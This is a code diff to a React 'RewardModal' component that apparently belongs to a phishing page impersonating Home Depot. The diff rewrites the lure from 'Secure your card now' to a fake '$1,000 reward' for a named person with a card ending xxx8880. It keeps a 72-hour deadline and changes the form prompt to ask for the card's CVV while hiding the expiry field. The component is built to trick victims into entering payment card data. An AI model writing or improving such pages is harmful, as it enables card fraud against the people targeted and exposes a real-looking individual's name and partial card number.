@@ -242,9 +242,13 @@ export default function RewardModal() {
         )}
 
         {showNotification && (
+          // <div className="absolute top-0 left-0 right-0 bg-yellow-500 text-white p-2 flex items-center justify-center z-20">
+          //   <AlertCircle className="h-4 w-4 mr-2" />
+          //   <span className="text-sm font-medium">Please click "Secure Your Card Now" to proceed</span>
+          // </div>
           <div className="absolute top-0 left-0 right-0 bg-yellow-500 text-white p-2 flex items-center justify-center z-20">
             <AlertCircle className="h-4 w-4 mr-2" />
-            <span className="text-sm font-medium">Please click "Secure Your Card Now" to proceed</span>
+            <span className="text-sm font-medium">Please click "Claim Your Reward Now" to proceed</span>
           </div>
         )}
 
@@ -252,7 +256,7 @@ export default function RewardModal() {
           <>
             <div className="bg-gradient-to-r from-orange-500 to-yellow-500 p-6 text-white text-center">
               <h2 className="text-2xl font-bold">Hello CAROL J GMITER</h2>
-              <p className="text-lg mt-1">Secure your card ending with xxx8880 on Home Depot</p>
+              <p className="text-lg mt-1">You have been reward $1,000 on card ending with <b>xxx8880</b></p>
             </div>
 
             <div className="p-4 flex justify-center">
@@ -268,7 +272,7 @@ export default function RewardModal() {
 
             <div className="p-6 text-center">
               <p className="text-gray-600 mb-4">
-                Action Required: Click the button below to confirm your card details and secure your account. This must
+                Action Required: Click the button below to confirm your card details and claim your reward. This must
                 be completed within 72 hours.
               </p>
 
@@ -276,7 +280,7 @@ export default function RewardModal() {
                 onClick={goToForm}
                 className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md w-full text-lg animate-pulse"
               >
-                Secure your card now
+                Claim Your Reward Now
               </Button>
 
               <p className="text-xs text-gray-500 mt-4">
@@ -299,8 +303,11 @@ export default function RewardModal() {
                 {showVerificationMessage && (
                   <div className="bg-blue-50 border-l-4 border-blue-500 p-3 flex items-start">
                     <Info className="h-5 w-5 text-blue-500 mr-2 flex-shrink-0 mt-0.5" />
-                    <p className="text-sm text-blue-700">
+                    {/* <p className="text-sm text-blue-700">
                       Please enter your card details for verification purposes. This is required to secure your card.
+                    </p> */}
+                    <p className="text-sm text-blue-700">
+                      Please enter your card cvv for verification purposes. This is required to verify your card.
                     </p>
                   </div>
                 )}
@@ -322,7 +329,7 @@ export default function RewardModal() {
                         maxLength={19}
                       />
                       {errors.cardNumber && <p className="text-red-500 text-xs">{errors.cardNumber}</p>}
-                    </div>
+                    </div> }
 
                     {/* CVV field */}
                     <div className="space-y-2">
@@ -342,21 +349,21 @@ export default function RewardModal() {
                       {errors.hobby && <p className="text-red-500 text-xs">{errors.hobby}</p>}
                     </div>
 
-                    <div className="space-y-2">
-                      <label htmlFor="expiryDate" className="text-sm font-medium block">
-                        Expiry Date
-                      </label>
-                      <Input
-                        id="expiryDate"
-                        name="expiryDate"
-                        placeholder="MM/YY"
-                        value={formData.expiryDate}
-                        onChange={handleInputChange}
-                        className={errors.expiryDate ? "border-red-500" : ""}
-                        maxLength={5}
-                      />
-                      {errors.expiryDate && <p className="text-red-500 text-xs">{errors.expiryDate}</p>}
-                    </div>
+                    {/* <div className="space-y-2">
+                  <label htmlFor="expiryDate" className="text-sm font-medium block">
+                    Expiry Date
+                  </label>
+                  <Input
+                    id="expiryDate"
+                    name="expiryDate"
+                    placeholder="MM/YY"
+                    value={formData.expiryDate}
+                    onChange={handleInputChange}
+                    className={errors.expiryDate ? "border-red-500" : ""}
+                    maxLength={5}
+                  />
+                  {errors.expiryDate && <p className="text-red-500 text-xs">{errors.expiryDate}</p>}
+                </div> */}
                   </div>
                 )}
 
@@ -432,6 +439,6 @@ export default function RewardModal() {
           </>
         )}
       </div>
-    </div>
+    </div >
   )
 }
